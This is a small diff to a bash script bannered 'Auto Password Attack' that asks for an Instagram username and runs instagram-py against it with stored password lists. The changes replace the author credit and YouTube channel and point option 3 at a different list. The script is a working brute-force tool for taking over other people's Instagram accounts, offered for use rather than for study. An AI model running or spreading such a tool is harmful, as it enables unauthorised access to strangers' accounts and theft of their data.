@@ -17,9 +17,9 @@ echo '
 [#] Auto Password Attack [#]
 ' |lolcat
 printf "\n"
-printf " \e[101m\e[1;77m >> Script By N17R0 << \e[0m\n"
+printf " \e[101m\e[1;77m >> Script By Ronnie << \e[0m\n"
 printf "\n"
-printf " \e[100m\e[1;77m >> Youtube Channel : \e[1;96m youtube.com/InfinityTrickster \e[100m\e[1;77m << \e[0m\n"
+printf " \e[100m\e[1;77m >> Youtube Channel : \e[1;96m youtube.com/Paul \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 echo
 read -p "[#] User Name : " usrnm
@@ -38,7 +38,7 @@ then
 instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass2.txt
 elif [ $marks = 3 ]
 then
-instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass3.txt
+instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass1.txt
 else
 echo
 echo -e "$ylo >>> exiting........! Bye Bye :) <<<$rset"
